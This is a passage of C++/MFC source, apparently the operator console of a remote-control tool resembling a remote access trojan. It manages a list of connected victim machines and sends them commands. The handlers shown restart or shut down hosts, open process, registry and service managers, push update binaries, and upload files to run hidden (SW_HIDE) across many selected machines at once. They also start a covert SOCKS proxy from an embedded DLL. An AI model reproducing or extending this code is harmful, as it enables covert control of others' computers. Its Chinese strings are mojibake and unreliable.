				pItem->SendCmd(WM_CONNECT_MESS, NULL);
			}
			nCheckCount ++;
		}
	}


	if(nCheckCount == 0)
	{
		MyServerTran* pItem = GetCurSelect();
		if(pItem != NULL)
		{
			pItem->SendCmd(WM_CONNECT_MESS, NULL);
		}
	}
}

void CMyClientManaView::OnUpdateClientManaMess(CCmdUI* pCmdUI) 
{
	if(GetListCtrl().GetSelectedCount() == 1)
	{
		pCmdUI->Enable(TRUE);
		return;
	}
	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		if(GetListCtrl().GetCheck(i))
		{
			pCmdUI->Enable(TRUE);
			return;
		}
	}
	pCmdUI->Enable(FALSE);
	
}

void CMyClientManaView::OnClientManaMult() 
{
	StartChildProcess(_T("����Ƶ���"), WM_CONNECT_MULT);
}

void CMyClientManaView::OnUpdateClientManaMult(CCmdUI* pCmdUI) 
{
	if(GetListCtrl().GetSelectedCount() == 1)
	{
		pCmdUI->Enable(TRUE);
		return;
	}
	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		if(GetListCtrl().GetCheck(i))
		{
			pCmdUI->Enable(TRUE);
			return;
		}
	}
	pCmdUI->Enable(FALSE);
	
}

void CMyClientManaView::OnClientManaProc() 
{
	StartChildProcess(_T("���̹���"), WM_CONNECT_PROC);
}

void CMyClientManaView::OnUpdateClientManaProc(CCmdUI* pCmdUI) 
{
	if(GetListCtrl().GetSelectedCount() == 1)
	{
		pCmdUI->Enable(TRUE);
		return;
	}
	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		if(GetListCtrl().GetCheck(i))
		{
			pCmdUI->Enable(TRUE);
			return;
		}
	}
	pCmdUI->Enable(FALSE);
}

void CMyClientManaView::OnClientManaRegt() 
{
	StartChildProcess(_T("ע������"), WM_CONNECT_REGT);
}

void CMyClientManaView::OnUpdateClientManaRegt(CCmdUI* pCmdUI) 
{
	if(GetListCtrl().GetSelectedCount() == 1)
	{
		pCmdUI->Enable(TRUE);
		return;
	}
	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		if(GetListCtrl().GetCheck(i))
		{
			pCmdUI->Enable(TRUE);
			return;
		}
	}
	pCmdUI->Enable(FALSE);
}

void CMyClientManaView::OnClientManaServ() 
{
	StartChildProcess(_T("�������"), WM_CONNECT_SERV);
}

void CMyClientManaView::OnUpdateClientManaServ(CCmdUI* pCmdUI) 
{
	if(GetListCtrl().GetSelectedCount() == 1)
	{
		pCmdUI->Enable(TRUE);
		return;
	}
	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		if(GetListCtrl().GetCheck(i))
		{
			pCmdUI->Enable(TRUE);
			return;
		}
	}
	pCmdUI->Enable(FALSE);
}

void CMyClientManaView::OnClientPcRestart() 
{
	if(MessageBox(_T("ȷ��Ҫ���������ƶ˻�����"), PS_CAOZUO, MB_OKCANCEL|MB_ICONQUESTION) != IDOK)
	{
		return;
	}
	MyServerTran* pItem = GetCurSelect();
	if(pItem != NULL)
	{
		pItem->SendCmd(CLIENT_SYSTEM_RESTART, NULL);
		return;
	}
}

void CMyClientManaView::OnUpdateClientPcRestart(CCmdUI* pCmdUI) 
{
	pCmdUI->Enable(GetListCtrl().GetSelectedCount() == 1);
}

void CMyClientManaView::OnClientPcShutdown() 
{
	if(MessageBox(_T("ȷ��Ҫ�رձ����ƶ˻�����"), PS_CAOZUO, MB_OKCANCEL|MB_ICONQUESTION) != IDOK)
	{
		return;
	}
	MyServerTran* pItem = GetCurSelect();
	if(pItem != NULL)
	{
		pItem->SendCmd(CLIENT_SYSTEM_SHUTDOWN, NULL);
		return;
	}
}

void CMyClientManaView::OnUpdateClientPcShutdown(CCmdUI* pCmdUI) 
{
 	pCmdUI->Enable(GetListCtrl().GetSelectedCount() == 1);
}

void CMyClientManaView::OnClientUpdateFile() 
{
	CMyUpdateDlg dlg;
	TCHAR m_FileName[512] = {0};
	GetPrivateProfileString(_T("����"), _T("�����ļ�"), _T(""), m_FileName, 256, GetIniFileName());
	dlg.m_Value = m_FileName;
	if(dlg.DoModal() == IDCANCEL)
	{
		return;
	}
	WritePrivateProfileString(_T("����"), _T("�����ļ�"), dlg.m_Value, GetIniFileName());

	//���ļ�����
	CFile m_File;
	if(!m_File.Open(dlg.m_Value, CFile::modeRead))
	{
		MessageBox(_T("�޷���ָ���ļ���"), _T("����"));
		return;
	}
	DWORD nFileLen = m_File.GetLength();
	BYTE* pData = new BYTE[nFileLen];
	m_File.Read(pData, nFileLen);
	m_File.Close();

	//����������
	TCHAR nCWndName[256] = {0};
	wsprintf(nCWndName, _T("%s���ӹ���"), PS_TITLE);
	HWND hWnd = ::FindWindow(NULL, nCWndName);
	if(hWnd == NULL)
	{
		delete [] pData;
		return ;
	}

	//���ṹ
	COPYDATASTRUCT ct = {0};
	ct.lpData = pData;
	ct.cbData = nFileLen;
	ct.dwData = PS_LOCAL_SEND_UPDATE;
	if(!::SendMessage(hWnd, WM_COPYDATA, 0, (LPARAM) &ct))
	{
		delete [] pData;
		return ;
	}
	delete [] pData;

	int nCheckCount = 0;

	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		if(GetListCtrl().GetCheck(i))
		{
			MyServerTran* pItem = (MyServerTran*) GetListCtrl().GetItemData(i);
			if(pItem != NULL)
			{
				pItem->SendCmd(WM_CONNECT_UPDA, NULL);
			}
			nCheckCount ++;
		}
	}


	if(nCheckCount == 0)
	{
		MyServerTran* pItem = GetCurSelect();
		if(pItem != NULL)
		{
			pItem->SendCmd(WM_CONNECT_UPDA, NULL);
		}
	}
}

void CMyClientManaView::OnUpdateClientUpdateFile(CCmdUI* pCmdUI) 
{
	if(GetListCtrl().GetSelectedCount() == 1)
	{
		pCmdUI->Enable(TRUE);
		return;
	}
	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		if(GetListCtrl().GetCheck(i))
		{
			pCmdUI->Enable(TRUE);
			return;
		}
	}
	pCmdUI->Enable(FALSE);	
}

void CMyClientManaView::OnClientUploadFile() 
{
	CMyUpLoadDlg dlg;
	TCHAR m_FileName[512] = {0};
	TCHAR m_StrParam[512] = {0};
	GetPrivateProfileString(_T("����"), _T("�����ļ�"), _T(""), m_FileName, 256, GetIniFileName());
	GetPrivateProfileString(_T("����"), _T("�����ļ�����"), _T(""), m_StrParam, 256, GetIniFileName());
	dlg.m_Value = m_FileName + 1;
	dlg.m_Show = (m_FileName[0] == _T('0')) ? 0 : 1;
	dlg.m_Param = m_StrParam;
	if(dlg.DoModal() == IDCANCEL)
	{
		return;
	}
	if(dlg.m_Show == 0)
	{
		m_FileName[0] = _T('0');
	}
	else
	{
		m_FileName[0] = _T('1');
	}
	lstrcpy(m_FileName + 1, dlg.m_Value);
	WritePrivateProfileString(_T("����"), _T("�����ļ�"), m_FileName, GetIniFileName());
	WritePrivateProfileString(_T("����"), _T("�����ļ�����"), dlg.m_Param, GetIniFileName());

	//���ļ�����
	CFile m_File;
	if(!m_File.Open(dlg.m_Value, CFile::modeRead))
	{
		MessageBox(_T("�޷���ָ���ļ���"), _T("����"));
		return;
	}
	DWORD nFileLen = m_File.GetLength();
	BYTE* pData = new BYTE[nFileLen + sizeof(MYUPLOADINFO)];
	m_File.Read(pData + sizeof(MYUPLOADINFO), nFileLen);
	m_File.Close();

	LPMYUPLOADINFO pInfo = (LPMYUPLOADINFO) pData;
	ZeroMemory(pInfo, sizeof(MYUPLOADINFO));

	//��ʾģʽ
	pInfo->m_IsShow = (dlg.m_Show == 0) ? SW_SHOW : SW_HIDE;

	//��չ��
	TCHAR* pFind = StrRChr(m_FileName, NULL, _T('.'));
	if(pFind == NULL)
	{
		MessageBox(_T("�Ƿ��ļ����ƣ�"), _T("����"));
		return;
	}
	pFind ++;

	//˫�ֽ�ת��
	char m_ATmpText[256] = {0};
	WideCharToMultiByte(CP_ACP, 0, pFind, lstrlen(pFind) + 1, m_ATmpText, 255, NULL, NULL);
	memcpy(pInfo->m_FileExt, m_ATmpText, lstrlen(pFind));

	//��չ����
	WideCharToMultiByte(CP_ACP, 0, dlg.m_Param, lstrlen(dlg.m_Param) + 1, pInfo->m_Param, 255, NULL, NULL);

	//����������
	TCHAR nCWndName[256] = {0};
	wsprintf(nCWndName, _T("%s���ӹ���"), PS_TITLE);
	HWND hWnd = ::FindWindow(NULL, nCWndName);
	if(hWnd == NULL)
	{
		delete [] pData;
		return ;
	}

	//���ṹ
	COPYDATASTRUCT ct = {0};
	ct.lpData = pData;
	ct.cbData = nFileLen + sizeof(MYUPLOADINFO);
	ct.dwData = PS_LOCAL_SEND_UPLOAD;
	if(!::SendMessage(hWnd, WM_COPYDATA, 0, (LPARAM) &ct))
	{
		delete [] pData;
		return ;
	}
	delete [] pData;

	int nCheckCount = 0;

	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		if(GetListCtrl().GetCheck(i))
		{
			MyServerTran* pItem = (MyServerTran*) GetListCtrl().GetItemData(i);
			if(pItem != NULL)
			{
				pItem->SendCmd(WM_CONNECT_UPLO, NULL);
			}
			nCheckCount ++;
		}
	}


	if(nCheckCount == 0)
	{
		MyServerTran* pItem = GetCurSelect();
		if(pItem != NULL)
		{
			pItem->SendCmd(WM_CONNECT_UPLO, NULL);
		}
	}
}

void CMyClientManaView::OnUpdateClientUploadFile(CCmdUI* pCmdUI) 
{
	if(GetListCtrl().GetSelectedCount() == 1)
	{
		pCmdUI->Enable(TRUE);
		return;
	}

	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		if(GetListCtrl().GetCheck(i))
		{
			pCmdUI->Enable(TRUE);
			return;
		}
	}
	pCmdUI->Enable(FALSE);
}

void CMyClientManaView::OnModifyTitle() 
{
	MyServerTran* pItem = GetCurSelect();
	if(pItem == NULL)
	{
		return;
	}

	CMyClientTitleDlg dlg(_T("�ͻ�ע��"), _T("�޸Ŀͻ�ע��"), pItem->GetNote());
	if(dlg.DoModal() != IDOK) 
	{
		return;
	}
	pItem->SetNote(dlg.m_Value);

	//���¿ͻ��˱�ע��Ϣ
	SetUserInfo(pItem->GetId(), dlg.m_Value, PS_INFO_NOTE);
	SetItemNote(dlg.m_Value, pItem->GetTitle());
}

void CMyClientManaView::OnUpdateModifyTitle(CCmdUI* pCmdUI) 
{
	pCmdUI->Enable(GetListCtrl().GetSelectedCount() == 1);
}

void CMyClientManaView::OnListSelectAll() 
{
	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		GetListCtrl().SetCheck(i, TRUE);
	}
}

void CMyClientManaView::OnUpdateListSelectAll(CCmdUI* pCmdUI) 
{
	BOOL m_IsCheck = FALSE;
	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		if(!GetListCtrl().GetCheck(i))
		{
			m_IsCheck = TRUE;
			break;
		}
	}
	pCmdUI->Enable(m_IsCheck);
}

void CMyClientManaView::OnListSelectNoone() 
{
	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		GetListCtrl().SetCheck(i, FALSE);
	}
}

void CMyClientManaView::OnUpdateListSelectNoone(CCmdUI* pCmdUI) 
{
	BOOL m_IsCheck = FALSE;
	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		if(GetListCtrl().GetCheck(i))
		{
			m_IsCheck = TRUE;
			break;
		}
	}
	pCmdUI->Enable(m_IsCheck);
}

void CMyClientManaView::OnClientOpenUrl() 
{
	TCHAR m_FileName[256] = {0};
	GetPrivateProfileString(_T("����"), _T("URL"), _T(""), m_FileName, 256, GetIniFileName());

	CMyOpenUrlDlg dlg(this);
	dlg.m_Url = m_FileName;
	if(dlg.DoModal() != IDOK) 
	{
		return;
	}
	WritePrivateProfileString(_T("����"), _T("URL"), dlg.m_Url, GetIniFileName());

	char* pData = new char[lstrlen(dlg.m_Url) + 1024];
	WideCharToMultiByte(CP_ACP, 0, dlg.m_Url, lstrlen(dlg.m_Url) + 1, pData, lstrlen(dlg.m_Url) + 1024, NULL, NULL);

	TCHAR nCWndName[256] = {0};
	wsprintf(nCWndName, _T("%s���ӹ���"), PS_TITLE);
	HWND hWnd = ::FindWindow(NULL, nCWndName);
	if(hWnd == NULL)
	{
		delete [] pData;
		return ;
	}

	//���ṹ
	COPYDATASTRUCT ct = {0};
	ct.lpData = pData;
	ct.cbData = lstrlen(dlg.m_Url);
	ct.dwData = PS_LOCAL_SEND_TURL;
	if(!::SendMessage(hWnd, WM_COPYDATA, 0, (LPARAM) &ct))
	{
		delete [] pData;
		return ;
	}
	delete [] pData;

	int nCheckCount = 0;

	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		if(GetListCtrl().GetCheck(i))
		{
			MyServerTran* pItem = (MyServerTran*) GetListCtrl().GetItemData(i);
			if(pItem != NULL)
			{
				pItem->SendCmd(WM_CONNECT_TURL, NULL);
			}
			nCheckCount ++;
		}
	}


	if(nCheckCount == 0)
	{
		MyServerTran* pItem = GetCurSelect();
		if(pItem != NULL)
		{
			pItem->SendCmd(WM_CONNECT_TURL, NULL);
		}
	}
}

void CMyClientManaView::OnUpdateClientOpenUrl(CCmdUI* pCmdUI) 
{
	if(GetListCtrl().GetSelectedCount() == 1)
	{
		pCmdUI->Enable(TRUE);
		return;
	}
	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		if(GetListCtrl().GetCheck(i))
		{
			pCmdUI->Enable(TRUE);
			return;
		}
	}
	pCmdUI->Enable(FALSE);
}

void CMyClientManaView::OnClientStartSocks() 
{
	CMyStartSocksDlg dlg(this);
	if(dlg.DoModal() != IDOK) 
	{
		return;
	}

	//ȡ�ļ�����
	TCHAR m_FileName[256] = {0};
	lstrcpy(m_FileName, _T("pclkey.dll"));
	GetSysFileName(m_FileName);
	BYTE* pSckFileData = NULL;
	DWORD m_SckSize = 0;
	if(!GetMySource(m_FileName, &pSckFileData, m_SckSize))
	{
		TCHAR m_Text[256] = {0};
		wsprintf(m_Text, _T("�ļ�%s��ʧ�����𻵣�����������"), m_FileName);
		MessageBox(m_Text, PS_WARNING, MB_OKCANCEL|MB_ICONWARNING);
		return;
	}

	MYSOCKSINFO m_SockInfo = {0};
	m_SockInfo.m_Port = StrToInt(dlg.m_Port);
	WideCharToMultiByte(CP_ACP, 0, dlg.m_User, lstrlen(dlg.m_User) + 1, m_SockInfo.m_User, 64, NULL, NULL);
	WideCharToMultiByte(CP_ACP, 0, dlg.m_Pass, lstrlen(dlg.m_Pass) + 1, m_SockInfo.m_Pass, 64, NULL, NULL);

	char* pData = new char[sizeof(MYSOCKSINFO) + m_SckSize];
	memcpy(pData, &m_SockInfo, sizeof(MYSOCKSINFO));
	memcpy(pData + sizeof(MYSOCKSINFO), pSckFileData, m_SckSize);
	delete [] pSckFileData;
	
	TCHAR nCWndName[256] = {0};
	wsprintf(nCWndName, _T("%s���ӹ���"), PS_TITLE);
	HWND hWnd = ::FindWindow(NULL, nCWndName);
	if(hWnd == NULL)
	{
		delete [] pData;
		return ;
	}

	//���ṹ
	COPYDATASTRUCT ct = {0};
	ct.lpData = pData;
	ct.cbData = m_SckSize + sizeof(MYSOCKSINFO);
	ct.dwData = PS_LOCAL_START_SOCKS;
	if(!::SendMessage(hWnd, WM_COPYDATA, 0, (LPARAM) &ct))
	{
		delete [] pData;
		return ;
	}
	delete [] pData;

	MyServerTran* pItem = GetCurSelect();
	if(pItem != NULL)
	{
		pItem->SendCmd(WM_CONNECT_SOCKS, (HWND) 0x01);
	}
}

void CMyClientManaView::OnUpdateClientStartSocks(CCmdUI* pCmdUI) 
{
	if(GetListCtrl().GetSelectedCount() == 1)
	{
		pCmdUI->Enable(TRUE);
		return;
	}
	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		if(GetListCtrl().GetCheck(i))
		{
			pCmdUI->Enable(TRUE);
			return;
		}
	}
	pCmdUI->Enable(FALSE);	
}

void CMyClientManaView::OnClientStopSocks() 
{
	if(MessageBox(_T("ȷ��Ҫ�ر�SOCKS�������"), _T("��ʾ"), MB_OKCANCEL) != IDOK)
	{
		return;
	}

	MyServerTran* pItem = GetCurSelect();
	if(pItem != NULL)
	{
		pItem->SendCmd(WM_CONNECT_SOCKS, 0x00);
	}
}

void CMyClientManaView::OnUpdateClientStopSocks(CCmdUI* pCmdUI) 
{
	if(GetListCtrl().GetSelectedCount() == 1)
	{
		pCmdUI->Enable(TRUE);
		return;
	}
	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		if(GetListCtrl().GetCheck(i))
		{
			pCmdUI->Enable(TRUE);
			return;
		}
	}
	pCmdUI->Enable(FALSE);
}
